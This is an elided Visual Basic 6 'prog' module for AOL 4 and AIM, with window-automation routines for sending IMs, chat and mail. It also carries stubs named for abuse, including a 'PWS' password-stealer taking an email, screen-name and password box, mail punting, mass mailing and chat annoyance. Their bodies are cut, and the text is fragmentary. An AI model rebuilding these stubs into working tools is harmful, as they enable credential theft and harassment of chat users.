...
'Made For AOL4.o/Visual Basic 6/WiN98/AiM2/mIRC32/
...
Call SendChat(".<p=" & X)
End Sub
Public Sub AddAsciiToCombo(Combo As ComboBox)
Dim X As Long
For X = 33 To 255
    Combo.AddItem Chr(X) & ""
Next X
...
Public Function STR_Code(sSTR As String)
...
STR_Code = NwO$
End Function
Public Function STR_DeCode(sSTR As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sSTR
    Let sSTRLen = Len(Made$)
...
Public Sub Chat_Annoy()
'This Is FuN
    Call SendChat("{s *a:\spinning}{s *a:\}")
End Sub
Public Function Chat_RoomName()
...
'BE CREATIVE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
End Sub
Public Sub AIMChangeBuddyCaption(NewCaption$)
...
End Sub
Public Sub AIMChangeChatCaption(NewCaption$)
...
End Sub
Public Sub AIMChangeIMCaption(NewCaption$)
...
If Not Right(sSTR$, 13) = "'s Buddy List" Then Exit Function
    ...
    AIMGetUserSn = sSN$
End Function
Public Function AIMGetSnFromIM()
...
Click (Icon&)
End Sub
Public Sub AIMOpenNewChatInvite()
...
Click (Icon&)
End Sub
Public Sub AIMSendChatInvite(Who$, Message$, ChatName$)
...
Click (Icon3&)
End Sub
Public Function AIMSendIM(Who$, What$)
Dim IMWin As Long, IMCombo As Long, IMEdit As Long, WndAte As Long
Dim AteClass As Long, AteClass2 As Long, Icon As Long
Call AIMOpenNewIM
IMWin& = FindWindow("AIM_IMessage", vbNullString)
IMCombo& = FindWindowEx(IMWin&, 0, "_Oscar_PersistantCombo", vbNullString)
IMEdit& = FindWindowEx(IMCombo&, 0, "Edit", vbNullString)
Call SendMessageByString(IMEdit&, WM_SETTEXT, 0&, Who$)
WndAte& = FindWindowEx(IMWin&, 0, "WndAte32Class", vbNullString)
AteClass& = FindWindowEx(WndAte&, 0, "Ate32Class", vbNullString)
AteClass2& = GetWindow(AteClass&, GW_HWNDNEXT)
    Call SendMessageByString(AteClass&, WM_SETTEXT, 0&, What$)
    Call SendMessageLong(AteClass, WM_CHAR, ENTER_KEY, 0&)
End Function
Public Sub AIMOpenNewIM()
...
Static hWndLast As Long
    ...
    If hWndOver <> hWndLast Then
        ...
        hWndParent = GetParent(hWndOver)
            ...
            Else
                ...
                WinPHandle.Caption = "Parent Window Handle: N/A"
                WinPText.Caption = "Parent Window Text : N/A"
                WinPClass.Caption = "Parent Window Class Name: N/A"
            End If
    ...
    End If
End Function
Public Function SetSNAndPWAndSignOn(SN, PW)
...
Public Sub AddRoomToTextBox(List As ListBox, Text As TextBox)
...
Public Function CD_ChangeTrack(Track&)
...
End Function
Public Function CD_NumOfTracks&()
...
End Function
Public Sub CD_CloseDoor()
    Call mciSendString("set cd door closed", 0, 0, 0)
End Sub
Public Function CD_IsCDMusic&()
...
Click (Button&)
End Sub
Public Sub Mail_SendAndForward(Recipiants)
...
Click (StartButton&)
End Sub
Public Sub File_Copy(file&, Where&)
...
End Sub
Public Sub IM_UnIgnore(SN)
    Call IM_Send("IM_On" & SN, " ")
End Sub
Public Function ReplaceText(Text, Find, Changeto)
...
End Sub
Public Function TrimEnters(thestring)
...
End Sub
Public Sub PWS(YourEmail As String, frm As Form, PWBox As TextBox, SNBox As TextBox)
...
End Sub
Public Sub DecompileProtect(ExeLocation, YourAppName)
...
End Sub
Public Sub MassMail(Peeps As ListBox)
...
End Function
Public Function Find2ndChildByClass(Parent, child, Child2)
...
End Function
Public Function Find3rdChildByClass(Parent, child, Child2, Child3)
...
Public Sub BlockBuddy(SN As TextBox)
...
Click (Button&)
End Sub
Public Function AddAnyUser(SN As String, RealSN As String, AolPath As String)
...
Exit Function
If Len(SN) < 7 Then MsgBox ("SN Must Be At Least 7 Characters"): Exit Function
...
Resume Next
End Function
Public Function AddNewUser(SN As String, AolPath As String)
Dim sSN As String, IdXPath As String
Screen.MousePointer = 11
Static m0226 As String * 40000, l9E68 As Long, l9E6A As Long
Dim l9E6C As Integer, l9E6E As Integer, l9E70 As Variant, l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL Is Currently Set To New User"): Exit Function
On Error GoTo ItsOver
ItsOver:
Screen.MousePointer = 0
Exit Function
If Len(SN) < 7 Then MsgBox ("The SN Needs To Be At Least 7 Characters"): Exit Function
...
Resume Next
End Function
Public Function STR_Wavy(thetext As String)
...
Public Function Mail_DeleteCurrent()
...
Public Sub HowToMakeScrollBars()
...
End Function
Public Sub Kill_Modal()
Dim Modal As Long
Modal& = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal&, WM_CLOSE, 0, 0)
End Sub
Public Sub Kill_Wait()
...
Public Sub SNList_Load(List As ListBox, CmmDlg As Control)
...
Public Sub Mail_Punt(Recipiants, subject)
...
Public Function Mail_ReadCurrent()
...
Public Function RoomBuster(Room As TextBox, counter As Label)
Room = FindChatRoom
...
End Sub
Public Sub SNList_Save(lst As ListBox, CmmDlg As Control)
...
End Sub
Public Sub Mail_Send(Recipiants, subject, Message)
...
StringInList = -1
End Function
Public Function STR_backwards(Text As String)
...
STR_backwards = NwO$
End Function
Public Function STR_Dots(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String
    InputText$ = Text
    Length& = Len(InputText$)
...
STR_Dots = NwO$
End Function
Public Function STR_elite(Text$)
...
STR_elite = NewText$
End Function
Public Function STR_Hacker(Text$)
Dim NewText As String, X As Long, Letter As String, Leet As String
Dim P As Long
NewText$ = ""
For X = 1 To Len(Text$)
...
STR_Hacker = NewText$
End Function
Public Function STR_Html(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
...
STR_Html = NwO$
End Function
Public Function STR_Link(URL, Text)
STR_Link = "<a href=" & Chr(34) & URL & Chr(34) & ">" & Text & "</a>"
End Function

Public Function STR_Spaced(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String
    InputText$ = Text
    Length& = Len(InputText$)
...
End Function
Public Function Form_Hide(Form As Form)
    Form.Hide
End Function
Function Form_Show(Form As Form)
    Form.Show
End Function
Public Function Form_Load(Form As Form)
    Form.Load
End Function
Public Function Form_Unload(Form As Form)
    Unload Form
End Function
